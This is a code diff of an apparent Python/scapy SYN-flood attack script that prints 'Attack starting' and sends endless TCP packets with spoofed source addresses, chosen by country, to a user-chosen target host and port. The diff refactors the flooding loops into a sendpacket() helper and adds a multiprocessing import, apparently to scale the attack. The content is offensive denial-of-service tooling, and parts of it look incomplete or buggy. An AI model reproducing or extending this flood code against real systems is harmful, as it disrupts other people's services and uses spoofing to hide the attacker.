@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-
+import multiprocessing
 from scapy.all import *	
 import socket
 from userinputs_synflood import *
@@ -23,21 +23,16 @@ cnt = 0
 silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 silva.connect((destination, targetport))
 
-if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
+if awnser_anonymizing in supcountries:
    useriprange = chooseiprange(awnser_anonymizing, supcountries)
    Ip_range = ipRange(useriprange)
    time.sleep(5)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
-   print 'Attack starting'
-   while 0 == 0:         
-         Tcp_packet = setpacketinfotcp(targetport)
-         Ip_packet = setpacketinfoip(Ip_range,destination)
-         silva.send(bytes((Ip_packet/Tcp_packet)))
-         cnt = cnt + 1
-         print str(cnt) + ' packeges send'
-
+   print 'Attack starting'      
+   sendpacket(Ip_range, destination, targetport, silva)
+   
 if awnser_anonymizing == yourIP:
    Ip_range = yourIP
    time.sleep(5)
@@ -45,14 +40,7 @@ if awnser_anonymizing == yourIP:
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
-   while 0 == 0:         
-         Tcp_packet = setpacketinfotcp(targetport)
-         Ip_packet = setpacketinfoip(Ip_range,destination)
-         silva.send(bytes((Ip_packet/Tcp_packet)))
-         cnt = cnt + 1
-         print str(cnt) + ' packeges send'
-        
-         
+   sendpacket(Ip_range, destination, targetport, silva)
 
 if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
     Ip_range = awnser_anonymizing
@@ -61,12 +49,7 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     print 'HaCkEr5pReMe'
     print ''
     print 'Attack starting'
-    while 0 == 0:
-         Ip_packet = setpacketinfoip(Ip_range,destination)
-         Tcp_packet = setpacketinfotcp(targetport)
-         silva.send(bytes((Ip_packet/Tcp_packet)))
-         cnt = cnt + 1
-         print str(cnt) + ' packeges send'
+    sendpacket(Ip_range, destination, targetport, silva)
 
 
 if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
@@ -77,12 +60,15 @@ if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
         print 'HaCkEr5pReMe'
         print ''
         print 'Attack starting'
-        while 0 == 0:
-          Ip_packet = setpacketinfoip(Ip_range,destination)
-          Tcp_packet = setpacketinfotcp(targetport)
-          silva.send(bytes((Ip_packet/Tcp_packet)))
-          cnt = cnt + 1
-          print str(cnt) + ' packeges send'
+        sendpacket(Ip_range, destination, targetport, silva)
+
+
+
+
+
+
+
+
 
         
         
